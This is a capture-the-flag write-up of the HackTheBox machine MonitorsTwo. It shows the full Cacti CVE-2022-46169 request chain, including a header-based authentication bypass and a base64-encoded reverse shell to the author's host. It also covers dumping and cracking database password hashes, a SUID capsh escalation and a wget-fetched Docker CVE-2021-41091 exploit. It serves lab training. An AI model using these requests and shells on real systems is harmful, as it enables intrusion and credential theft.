---
layout: post
title: From Default Credentials to Full Control - Unraveling MonitorsTwo on HackTheBox
date: 06/08/2023
author: Nehal Zaman
tags: ["CVE-2022-46169", "cacti exploit", "docker breakout", "CVE-2021-41091", "docker privilege escalation"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/monitorstwo/banner.png)

# INTRODUCTION

Greetings everyone, in this blog, we'll be diving into [MonitorsTwo](https://app.hackthebox.com/machines/MonitorsTwo), a beginner-friendly Linux machine crafted by [TheCyberGeek](https://app.hackthebox.com/users/114053) on [HackTheBox](https://app.hackthebox.com/home). 

Our journey begins by exploiting a vulnerable version of `Cacti` to gain initial access. Then, we'll uncover hidden secrets to obtain user credentials, enabling us to escape the `Docker` environment. 

Finally, we'll exploit the same `Docker` setup to achieve `root` access. 

Let's explore the steps to conquer **MonitorsTwo** together!

# SCANNING

```bash
┌──(kali㉿kali)-[~/Documents/htb/monitorstwo]
└─$ rustscan -a 10.10.11.211 -r 1-65535 -u 5000                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.211:22
Open 10.10.11.211:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-06 08:45 EDT
Initiating Ping Scan at 08:45
Scanning 10.10.11.211 [2 ports]
Completed Ping Scan at 08:45, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:45
Completed Parallel DNS resolution of 1 host. at 08:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:45
Scanning 10.10.11.211 [2 ports]
Discovered open port 22/tcp on 10.10.11.211
Discovered open port 80/tcp on 10.10.11.211
Completed Connect Scan at 08:45, 0.22s elapsed (2 total ports)
Nmap scan report for 10.10.11.211
Host is up, received syn-ack (0.17s latency).
Scanned at 2023-08-06 08:45:14 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

`Rustscan` has unveiled 2 accessible ports: **22** and **80**.

```bash
┌──(kali㉿kali)-[~/Documents/htb/monitorstwo]
└─$ nmap -sC -sV -p22,80 10.10.11.211                       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-06 08:46 EDT
Nmap scan report for 10.10.11.211
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
```

Port 22 hosts an **SSH** service, while port 80 is home to a **web service**, specifically `Cacti`.

# ENUMERATING WEB

![](/assets/images/writeups/monitorstwo/1.png)

Upon navigating to the web interface, the default login page of `Cacti` greets us.

![](/assets/images/writeups/monitorstwo/2.png)

By leveraging a weak set of credentials (`admin`/`admin`), we successfully gain access to the application.

The `Cacti` version present here is `1.2.22`.

Upon conducting a swift Google search, it becomes evident that this specific version of `Cacti` is susceptible to an `unauthenticated remote code execution`, identified as `CVE-2022-46169`.

This vulnerability comprises two distinct components: an `authentication bypass` vulnerability, alongside a `remote code execution` vulnerability.

You can more about the vulnerability: [here](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/).

# ANALYSING THE `AUTHENTICATION BYPASS` ISSUE

The `remote_agent.php` script in `Cacti` is meant to be used by authorized clients only.

```bash
GET /remote_agent.php HTTP/1.1
Host: 10.10.11.211
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: Cacti=f755b3fc5f85ec444345b298ec66e223; CactiDateTime=Sun Aug 06 2023 08:52:48 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240
Upgrade-Insecure-Requests: 1

```

```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 13:07:25 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.33
Last-Modified: Sun, 06 Aug 2023 13:07:19 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
P3P: CP="CAO PSA OUR"
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Length: 49

FATAL: You are not authorized to use this service
```

When we tried to access `/remote_agent.php`, we encountered an error message saying `FATAL: You are not authorized to use this service`.

It appears that this error is related to a filter based on `IP` addresses.

However, we managed to bypass this filter quite easily. By adding a special HTTP header called `X-Forwarded`, we tricked the system into thinking that the request was coming from an authorized client, in this case, `127.0.0.1`.

```bash
GET /remote_agent.php HTTP/1.1
Host: 10.10.11.211
X-Forwarded: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: Cacti=f755b3fc5f85ec444345b298ec66e223; CactiDateTime=Sun Aug 06 2023 08:52:48 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240
Upgrade-Insecure-Requests: 1

```

```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 06 Aug 2023 13:11:59 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.33
Last-Modified: Sun, 06 Aug 2023 13:11:58 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
P3P: CP="CAO PSA OUR"
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Length: 21

Unknown Agent Request
```

After making this adjustment, the error message disappeared. This means we successfully got past the initial restriction.

# ANALYSING THE `REMOTE CODE EXECUTION`

The parameter `poller_id` provided by the user is directly utilized as the first argument for the `proc_open` PHP function, lacking any form of sanitization or escaping.

This issue can be exploited by a malicious user through manipulation of the `action` parameter, setting it to `polldata`.

However, to successfully exploit this vulnerability, two additional prerequisites are required: a valid `host_id` and `local_data_ids`

![](/assets/images/writeups/monitorstwo/3.png)

There is just one entry for the host `Linux Local Machine`, which carries an ID of `1`. This entry signifies the local system itself.

![](/assets/images/writeups/monitorstwo/4.png)

Among the various data sources, we will focus on the `Local Linux Machine - Uptime` entry with an ID of `6`. This choice is influenced by its association with the `Device - Uptime` template, which incorporates the crucial `POLLER_ACTION_SCRIPT_PHP` action, pivotal in initiating the `proc_open` call.

With all the necessary components in place, we proceed to construct our request.

```bash
GET /remote_agent.php?action=polldata&host_id=1&local_data_ids%5b%5d=6&poller_id=;sleep%20100 HTTP/1.1
Host: 10.10.11.211
X-Forwarded: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: Cacti=f755b3fc5f85ec444345b298ec66e223; CactiDateTime=Sun Aug 06 2023 08:52:48 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240
Upgrade-Insecure-Requests: 1

```

In the example, we've added some code like `sleep 100` into the `poller_id` part. When we send this request, the server waits for 100 seconds before responding, showing that we've successfully made the code run remotely.

# SHELL AS `www-data`

```bash
GET /remote_agent.php?action=polldata&host_id=1&local_data_ids%5b%5d=6&poller_id=;echo%20YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC40NS80NDMgMD4mMSIK|base64%20-d|bash HTTP/1.1
Host: 10.10.11.211
X-Forwarded: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: Cacti=f755b3fc5f85ec444345b298ec66e223; CactiDateTime=Sun Aug 06 2023 08:52:48 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240
Upgrade-Insecure-Requests: 1

```

```bash
┌──(kali㉿kali)-[~/Documents/htb/monitorstwo]
└─$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.45/443 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NS80NDMgMD4mMSIK
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/htb/monitorstwo]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.11.211] 45346
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ 
```

Leveraging the blind command injection vulnerability, we successfully attain a reverse shell as the user `www-data`.

# SHELL AS `marcus`

```bash
www-data@50bca5e748b0:/var/www/html$ ls -al /
ls -al /
total 84
drwxr-xr-x   1 root root 4096 Mar 21 06:49 .
drwxr-xr-x   1 root root 4096 Mar 21 06:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 06:49 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22 09:21 bin
drwxr-xr-x   2 root root 4096 Mar 22 09:21 boot
drwxr-xr-x   5 root root  340 Aug  6 09:53 dev
-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
drwxr-xr-x   1 root root 4096 Mar 21 06:49 etc
drwxr-xr-x   2 root root 4096 Mar 22 09:21 home
drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
drwxr-xr-x   2 root root 4096 Mar 22 09:21 lib64
drwxr-xr-x   2 root root 4096 Mar 22 09:21 media
drwxr-xr-x   2 root root 4096 Mar 22 09:21 mnt
drwxr-xr-x   2 root root 4096 Mar 22 09:21 opt
dr-xr-xr-x 312 root root    0 Aug  6 09:53 proc
drwx------   1 root root 4096 Mar 21 06:50 root
drwxr-xr-x   1 root root 4096 Nov 15  2022 run
drwxr-xr-x   1 root root 4096 Jan  9  2023 sbin
drwxr-xr-x   2 root root 4096 Mar 22 09:21 srv
dr-xr-xr-x  13 root root    0 Aug  6 09:53 sys
drwxrwxrwt   1 root root 4096 Aug  6 09:56 tmp
drwxr-xr-x   1 root root 4096 Nov 13  2022 usr
drwxr-xr-x   1 root root 4096 Nov 15  2022 var
```

The presence of `.dockerenv` within the `/` directory serves as confirmation that we are indeed operating within a Docker container.

```bash
www-data@50bca5e748b0:/var/www/html$ cat /entrypoint.sh
cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

Upon inspecting the `/` directory, we encounter the `entrypoint.sh` script, which divulges valuable database information.

```bash
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "show tables"
< --user=root --password=root cacti -e "show tables"
.
.
SNIP
.
.
snmpagent_managers
snmpagent_managers_notifications
snmpagent_mibs
snmpagent_notifications_log
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
.
.
SNIP
.
.
```

Among the various tables, the `user_auth` table captures our interest.

```bash
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "desc user_auth"
<user=root --password=root cacti -e "desc user_auth"
Field   Type    Null    Key     Default Extra
id      mediumint(8) unsigned   NO      PRI     NULL    auto_increment
username        varchar(50)     NO      MUL     0
password        varchar(256)    NO
realm   mediumint(8)    NO      MUL     0
full_name       varchar(100)    YES             0
email_address   varchar(128)    YES             NULL
must_change_password    char(2) YES             NULL
password_change char(2) YES             on
show_tree       char(2) YES             on
show_list       char(2) YES             on
show_preview    char(2) NO              on
graph_settings  char(2) YES             NULL
login_opts      tinyint(3) unsigned     NO              1
policy_graphs   tinyint(3) unsigned     NO              1
policy_trees    tinyint(3) unsigned     NO              1
policy_hosts    tinyint(3) unsigned     NO              1
policy_graph_templates  tinyint(3) unsigned     NO              1
enabled char(2) NO      MUL     on
lastchange      int(11) NO              -1
lastlogin       int(11) NO              -1
password_history        varchar(4096)   NO              -1
locked  varchar(3)      NO
failed_attempts int(5)  NO              0
lastfail        int(10) unsigned        NO              0
reset_perms     int(10) unsigned        NO              0
```

Within the `user_auth` table, we identify noteworthy columns: `username` and `password`.

```bash
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select username,password from user_auth"
< cacti -e "select username,password from user_auth"
username        password
admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
guest   43e9a4ab75570f5b
marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

Of note, the user `marcus` emerges as a particularly intriguing entry, likely associated with the host machine.

The hash, initiated with `$2y$`, indicates its nature as a bcrypt hash.

```bash
┌──(kali㉿kali)-[~/Documents/htb/monitorstwo]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:01:36 DONE (2023-08-06 10:07) 0.01035g/s 88.32p/s 88.32c/s 88.32C/s lilpimp..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Employing `john`, we successfully decrypt the hash, unveiling the password: `funkymonkey`.

```bash
┌──(kali㉿kali)-[~/Documents/htb/monitorstwo]
└─$ ssh marcus@10.10.11.211
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 06 Aug 2023 02:09:20 PM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        252
  Users logged in:                  1
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:6983


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Sun Aug  6 14:01:44 2023 from 10.10.16.72
marcus@monitorstwo:~$ id; hostname; date 
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
monitorstwo
Sun 06 Aug 2023 02:09:35 PM UTC
```

As it turns out, `marcus` has reused this password, enabling us to establish an SSH connection into the system.

# PRIVILEGE ESCALATION TO `root`

```bash
marcus@monitorstwo:~$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

A brief search on Google discloses the vulnerability `CVE-2021-41091`, affecting this specific `Docker` version.

`CVE-2021-41091` represents a flaw within Docker Engine, allowing unprivileged Linux users to navigate through and execute programs within the data directory (typically situated at `/var/lib/docker`) due to inadequately restricted permissions. This vulnerability emerges when containers contain executable programs with extended permissions, such as `setuid`. Consequently, unprivileged Linux users can locate and execute these programs, and potentially manipulate files if the `UID` of the user on the host matches the file owner or group within the container.

A well-illustrated Proof of Concept (PoC) and a detailed account of the vulnerability are furnished [here](https://github.com/UncleJ4ck/CVE-2021-41091), with credit to [UncleJ4ck](https://github.com/UncleJ4ck).

Before proceeding with exploitation, our initial step entails gaining root privileges on the Docker instance.

```bash
www-data@50bca5e748b0:/var/www/html$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

We observe that the `capsh` executable is configured with the `SUID` bit. We can exploit this feature to elevate our privileges to `root` within the Docker container.

```bash
www-data@50bca5e748b0:/var/www/html$ capsh --uid=0 --gid=0 --
capsh --uid=0 --gid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

whoami
root

hostname
50bca5e748b0
```

The subsequent objective is to set the `SUID` bit for `/bin/bash`.

```bash
chmod u+s /bin/bash
ls -al /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

The final stage involves executing the exploit supplied by [UncleJ4ck](https://github.com/UncleJ4ck).

```bash
marcus@monitorstwo:/tmp/curiosity$ wget 'http://10.10.14.45/exp.sh'
--2023-08-06 14:33:56--  http://10.10.14.45/exp.sh
Connecting to 10.10.14.45:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2446 (2.4K) [text/x-sh]
Saving to: ‘exp.sh’

exp.sh                                          100%[====================================================================================================>]   2.39K  --.-KB/s    in 0.002s  

2023-08-06 14:33:56 (1.33 MB/s) - ‘exp.sh’ saved [2446/2446]

marcus@monitorstwo:/tmp/curiosity$ chmod +x exp.sh 
marcus@monitorstwo:/tmp/curiosity$ ./exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/tmp/curiosity$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# 
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# 
bash-5.1# hostname
monitorstwo
bash-5.1# 
```

As a result of these actions, we successfully achieve `root` privileges.

# CONCLUSION

To sum it up, our journey through **MonitorsTwo** on **HackTheBox** exposed a series of important vulnerabilities. We initially gained access using default credentials for `Cacti`, taking advantage of a weakness in version `1.2.22` that allowed **remote code execution without authentication** (`CVE-2022-46169`).

Within a `Docker` container, we extracted key information from the database, including a user hash from the main system. By cracking this hash, we managed to access the host machine via `SSH`.

Furthermore, we uncovered a serious flaw in the host's `Docker` version (`20.10.5`) known as `CVE-2021-41091`. This flaw let us manipulate permissions and perform high-level actions within the `Docker` environment, ultimately giving us full control over the host machine.

That is all in this writeup.

Thanks for reading this far. Hope you liked it.
